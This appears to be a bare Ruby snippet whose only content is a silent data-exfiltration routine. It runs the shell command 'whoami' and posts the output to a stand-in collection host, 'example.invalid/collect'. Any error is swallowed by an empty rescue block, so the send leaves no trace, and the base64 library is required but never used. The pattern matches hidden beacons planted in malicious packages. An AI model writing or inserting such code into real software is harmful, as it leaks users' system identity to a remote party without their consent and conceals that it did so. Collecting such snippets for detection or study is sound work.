require 'net/http'
require 'uri'
require 'base64'
begin
  Net::HTTP.post_form(URI.parse("https://example.invalid/collect"), {'user' => "#{`whoami`}"})
rescue
ensure
end
